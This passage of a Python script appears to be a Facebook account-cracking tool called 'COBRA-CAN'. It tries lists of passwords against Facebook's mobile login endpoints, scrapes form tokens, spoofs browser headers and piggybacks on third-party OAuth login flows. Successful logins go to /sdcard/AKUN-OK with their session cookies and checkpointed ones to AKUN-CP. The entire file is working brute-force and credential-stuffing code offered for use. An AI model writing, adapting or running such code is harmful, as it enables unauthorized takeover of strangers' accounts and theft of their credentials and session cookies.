			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r┗━ {kun}{idf}|{pw}\n{xxx}┗━ {mer}{ua}{xxx}')
				#os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r┗━ {hijo}{idf}|{pw}|{kuki}\n{xxx}┗━ {hijo}{ua}{xxx}')
				#os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ ASYNC ]----------###
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[blue]COBRA-CAN [white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D4746b630-c014-4717-b1bc-9c1d6922f6ed%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26scope%3Demail%252Cpublic_profile%252Copenid%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1c14ca10-f5d6-42e9-bf43-79d4d8eaf557%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4746b630-c014-4717-b1bc-9c1d6922f6ed%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
            "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            "uid": idf,
            "next": "https://mbasic.facebook.com/v16.0/dialog/oauth?state=4746b630-c014-4717-b1bc-9c1d6922&response_type=code&client_id=525265914179580&redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26scope%3Demail%252Cpublic_profile%252Copenid%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1c14ca10-f5d6-42e9-bf43-79d4d8eaf557%26tp%3Dunspecified",
            "flow": "login_no_pin",
            "pass": pw,
            }
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2; wd=360x648'
			heade={
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'dpr': '1',
            'viewport-width': '384',
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="119.0.6045.160", "Chromium";v="119.0.6045.160", "Not?A_Brand";v="24.0.0.0"',
            'sec-ch-prefers-color-scheme': 'dark',
            'upgrade-insecure-requests': '1',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D4746b630-c014-4717-b1bc-9c1d6922f6ed%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26scope%3Demail%252Cpublic_profile%252Copenid%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1c14ca10-f5d6-42e9-bf43-79d4d8eaf557%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4746b630-c014-4717-b1bc-9c1d6922f6ed%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'accept-language': 'en-US,en;q=0.9'
            }
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r┗━ {kun}{idf}|{pw}\n{xxx}┗━ {mer}{ua}{xxx}')
				#os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r┗━ {hijo}{idf}|{pw}\n{xxx}┗━{B}{kuki}\n{xxx}┗━ {ua}{xxx}')
				#os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ VALIDATE ]----------###
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[blue]COBRA-CAN [white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fapp_id%3D2572246932852997%26cbt%3D1701324889315%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df19ad207fd5edc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df1591e23a79190c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df183c91f29c2034%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%2526frame%253Df3c4e1988fb4ef4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df183c91f29c2034%26domain%3Dmyim3app.indosatooredoo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252Ff1fbb9d1d151054%26relation%3Dopener%26frame%3Df3c4e1988fb4ef4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
            "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            "uid": idf,
            "next": "https://m.facebook.com/v4.0/dialog/oauth?app_id=2572246932852997&cbt=1701324889315&channel_url=https.staticxx.facebook.com&connect=xd_arbiter&version=2523&cb%253Df19ad207fd5edc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df1591e23a79190c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df183c91f29c2034%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%2526frame%253Df3c4e1988fb4ef4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified",
            "flow": "login_no_pin",
            "pass": pw,
            }
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2; wd=360x648'
			heade={
            'Host': 'm.facebook.com',
            'cache-control': 'max-age=0',
            'dpr': '1',
            'viewport-width': '384',
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="119.0.6045.160", "Chromium";v="119.0.6045.160", "Not?A_Brand";v="24.0.0.0"',
            'sec-ch-prefers-color-scheme': 'dark',
            'upgrade-insecure-requests': '1',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fapp_id%3D2572246932852997%26cbt%3D1701324889315%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df19ad207fd5edc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df1591e23a79190c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df183c91f29c2034%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%2526frame%253Df3c4e1988fb4ef4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df183c91f29c2034%26domain%3Dmyim3app.indosatooredoo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252Ff1fbb9d1d151054%26relation%3Dopener%26frame%3Df3c4e1988fb4ef4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'accept-language': 'en-US,en;q=0.9'
            }
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r┗━ {kun}{idf}|{pw}\n{xxx}┗━ {mer}{ua}{xxx}')
				#os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r┗━ {hijo}{idf}|{pw}\n{xxx}┗━{biru}{kuki}')
				#os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
###----------#[ CREAT FILE ]#----------###
def memulai():
	try:os.mkdir('/sdcard/AKUN-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('/sdcard/AKUN-CP')
	except:pass
	menu()
if __name__=='__main__':
	memulai()
